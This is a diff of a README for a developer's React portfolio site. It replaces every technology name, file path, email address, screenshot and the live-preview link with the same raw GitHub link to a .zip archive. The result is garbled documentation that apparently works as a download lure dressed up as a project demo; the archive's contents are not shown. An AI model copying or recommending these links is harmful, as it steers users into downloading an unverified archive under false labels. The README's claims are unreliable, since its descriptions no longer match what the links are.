@@ -1,17 +1,17 @@
 # ⚛️ Formal Portfolio Website - Satya Sundar Dey
 
-Welcome to my **Formal Portfolio** built using **https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip** and **CSS Modules**.  
+Welcome to my **Formal Portfolio** built using **https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip** and **CSS Modules**.  
 This portfolio showcases my skills, projects, and contact details in a responsive and elegant layout — perfect for developers, recruiters, and clients.
 
 ## 🔗 Live Preview
 
-🌐 [Click to Visit Portfolio](https://satyasundardey-portfolio.vercel.app/)
+🌐 [Click to Visit Portfolio](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip)
 
 ---
 
 ## 🚀 Features
 
-- ⚛️ Built with https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip (Functional Components)
+- ⚛️ Built with https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip (Functional Components)
 - 🎨 Scoped styling using CSS Modules
 - 📱 Responsive design for all devices
 - 💼 Projects section with live previews
@@ -23,7 +23,7 @@ This portfolio showcases my skills, projects, and contact details in a responsiv
 
 ## 🧠 Tech Stack
 
-- **https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip**
+- **https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip**
 - **JavaScript (ES6+)**
 - **CSS Modules**
 - **GitHub Pages** (deployment)
@@ -41,16 +41,16 @@ src/
 │ ├── Skills/
 │ ├── Projects/
 │ ├── Contact/
-├── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip # Main app component
-├── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip # Global app styles
-└── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip # Entry point 
+├── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip # Main app component
+├── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip # Global app styles
+└── https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip # Entry point 
 ```
 
 ---
 
 ## 📸 Screenshots
 
-![Portfolio Screenshot](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip)
+![Portfolio Screenshot](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip)
 
 ---
 
@@ -58,6 +58,6 @@ src/
 
 Feel free to reach out or connect:
 
-- 📧 Email: https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip  
-- 🐙 GitHub: [dotsatya](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/dinomic/Formal-Portfolio.zip)
+- 📧 Email: https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip  
+- 🐙 GitHub: [dotsatya](https://raw.githubusercontent.com/dotsatya/Formal-Portfolio/main/src/components/Contact/Formal_Portfolio_2.3.zip)
 
